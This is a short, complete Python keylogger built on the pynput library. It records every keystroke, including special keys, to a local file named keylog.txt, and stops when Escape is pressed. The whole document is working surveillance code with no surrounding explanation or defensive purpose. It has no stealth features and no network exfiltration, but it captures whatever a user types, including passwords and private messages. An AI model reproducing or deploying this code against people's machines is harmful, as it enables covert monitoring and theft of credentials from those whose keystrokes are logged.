from pynput.keyboard import Listener, Key

# This function is called every time a key is pressed
def on_press(key):
    try:
        # Open the file in append mode and write the key to the file
        with open("keylog.txt", "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Enter, Backspace, Space) differently
        with open("keylog.txt", "a") as file:
            file.write(f"{key}")

# This function is called when a key is released
def on_release(key):
    # Stop listener if the "Escape" key is pressed
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
